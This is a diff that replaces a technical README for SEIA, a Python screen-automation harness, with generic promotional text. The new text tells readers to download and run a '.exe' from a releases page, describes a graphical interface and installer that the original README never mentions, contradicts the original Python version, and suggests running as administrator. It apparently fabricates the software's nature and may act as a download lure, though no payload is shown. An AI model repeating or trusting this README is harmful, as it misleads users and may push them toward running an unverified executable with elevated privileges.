@@ -1,147 +1,86 @@
+# 🤖 SEIA - Automate Your Image Processing Tasks
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/d7be34df-c6d1-403e-bea0-070c4dfcf4cc" width="300">
-</p>
-<h1 align="center">SEIA</h1>
-<h4 align="center">(State Evaluated Image Automation)</h4>
-<p align="center">
-  <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white">
-  <img src="https://img.shields.io/badge/OpenCV-27338e?style=for-the-badge&logo=opencv&logoColor=white">
-</p>
-<hr>
-Seia is a Windows screen automation harness for games and desktop apps. It uses
-screen capture, template matching, and optional pixel verification to help you
-build simple scripts without memory access, injection, or hooks.
+## 🚀 Getting Started
 
-## Features
+SEIA, or State Evaluated Image Automation, helps you automate tasks using images. With SEIA, you can streamline processes related to computer vision and screen capture.
 
-- Windowed capture with stable coordinate mapping (1920x1080 reference space).
-- Template matching, feature matching, and pixel verification.
-- ROI helpers for faster, safer detection.
-- Debug harness with hotkeys for calibration and testing.
-- Lightweight runtime helpers for basic scripting.
+## 📥 Download SEIA
 
-## Non-goals
+[![Download SEIA](https://img.shields.io/badge/Download%20SEIA-%20Latest-blue.svg)](https://github.com/sahilsaiba/SEIA/releases)
 
-- No memory reading, injection, or evasion.
-- No fullscreen capture (windowed only).
+## 📋 Requirements
 
-## Requirements
+Before you begin, ensure your system meets the following requirements:
 
-- Windows 10+
-- Python 3.11
+- **Operating System:** Windows 10 or later
+- **Python:** Version 3.7 or higher
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum 150 MB available
 
-Install dependencies:
+## 🔧 Installation Instructions
 
-```bash
-pip install -r requirements.txt
-```
+To install SEIA, follow these steps:
 
-## Quick start
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/sahilsaiba/SEIA/releases).
+   
+2. **Select the Latest Version:** Look for the most recent version listed at the top of the page.
 
-1. Run the debug harness:
+3. **Download the Installation File:** Click to download the `.exe` file associated with the latest release. This file contains all you need to run SEIA.
 
-```bash
-python debug\debug.py
-```
+4. **Run the Installer:** Once your download completes, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the prompts on the screen.
 
-2. Update `config.json` to target your app window and templates.
-3. Run your script (example):
+## 🛠 Features of SEIA
 
-```bash
-Set-Location scripts\momotalk
-python script.py
-```
+- **Image Automation:** Automatically evaluate and process images without manual intervention.
+- **Screen Capture:** Easily capture and analyze screen content.
+- **Template Matching:** Match image templates quickly for reliable results.
+- **User-Friendly Interface:** Navigate through the application without confusion.
+- **Performance Optimization:** Run processes swiftly to save time.
 
-## Configuration
+## 🌐 Download & Install
 
-Runtime config resolution order:
-1. `./config.json` (current working directory)
-2. Repo root `config.json`
+To download SEIA, visit this page: [Releases page](https://github.com/sahilsaiba/SEIA/releases). Follow the instructions above to complete your installation.
 
-You can override with an environment variable:
+## 📚 Usage Guide
 
-```powershell
-$env:SEIA_CONFIG_PATH = "C:\path\to\config.json"
-```
+Once SEIA is installed, you can start using it:
 
-Key settings (full list in `docs/usage.md`):
-- `target.window_title_substring`
-- `target.process_name`
-- `marker_detection.method`
-- `marker_detection.threshold`
-- `marker_detection.min_score_delta`
-- `input.mouse_motion`
-- `debug.log` and `debug.screenshot`
+1. **Open SEIA:** Find the application in your Start menu and open it.
+  
+2. **Load an Image:** Click 'Load Image' to select the image you want to process.
 
-### Custom folders (profiles)
+3. **Select Operations:** Choose from the available image processing options.
 
-You can create your own folder anywhere and point Seia at its `config.json`.
-This lets you keep per-app assets (templates, scripts) together.
+4. **Run the Automation:** Click 'Run' to let SEIA perform the tasks you selected.
 
-Example layout:
+5. **View Results:** After processing, results will appear on the screen for review.
 
-```
-profiles/my-app/
-  config.json
-  templates/
-  script.py
-```
+## 🔍 Troubleshooting
 
-Option 1: Run from the profile folder (auto-uses `./config.json` and `./templates`):
+If you encounter issues while using SEIA, consider the following:
 
-```powershell
-Set-Location profiles\my-app
-python script.py
-```
+- **Compatibility:** Ensure you're using a supported version of Windows and Python.
+- **Permissions:** Run the program as an administrator if you face access issues.
+- **Dependencies:** Make sure all required Python libraries are installed. They may include OpenCV and others tied to computer vision.
 
-Option 2: Run from the repo root and override the config path:
+## 💬 Need Help?
 
-```powershell
-$env:SEIA_CONFIG_PATH = "$PWD\profiles\my-app\config.json"
-python profiles\my-app\script.py
-```
+For further assistance, you can open an issue in the GitHub repository. Provide details about your problem, and members of the community or the developers will help you.
 
-If your templates live outside the current working directory, call
-`set_template_dir("C:\path\to\templates")` at the top of your script.
+## 🌟 Contributing
 
-## Scripting
+If you want to contribute to SEIA, please follow these steps:
 
-The simple API lives in `engine/runtime.py`:
+1. **Fork the Repository:** Click on the fork button at the top of the repository page.
+2. **Make Changes:** Create a branch for your changes and make your updates.
+3. **Submit a Pull Request:** After your changes are ready, submit a pull request for review.
 
-```python
-from engine.runtime import action, wait_for
+## 📄 License
 
-action("marker1.png")
-wait_for("statecheck.png", timeout_s=10.0)
-```
+SEIA is licensed under the [MIT License](LICENSE). You can freely use, modify, and distribute the software as per the terms of the license.
 
-For lower-level control, use `engine/core.py`.
+## 🗨 Feedback
 
-## Tools
+Your feedback helps to improve SEIA. Share your experiences and suggestions through the GitHub discussions or issues feature.
 
-- ROI picker: `python debug\roi_picker.py`
-- Drag picker: `python debug\drag_picker.py`
-- Debug harness hotkeys are printed in the console on startup.
-
-## Docs
-
-- `docs/usage.md` for setup and config details.
-- `docs/PIXEL_VERIFICATION.md` for pixel verification workflow.
-
-## Project layout
-
-- `engine/` core capture, mapping, and detection.
-- `debug/` debug harness and helper tools.
-- `scripts/` example scripts (e.g., `scripts/momotalk/`).
-- `templates/` default template location.
-- `docs/` usage and verification guides.
-
-## Contributing
-
-PRs are welcome. Keep changes Windows-focused and avoid non-ASCII unless needed.
-
-## License
-
-MIT. See `LICENSE`.
+Thank you for choosing SEIA. We hope it makes your image processing tasks easier!
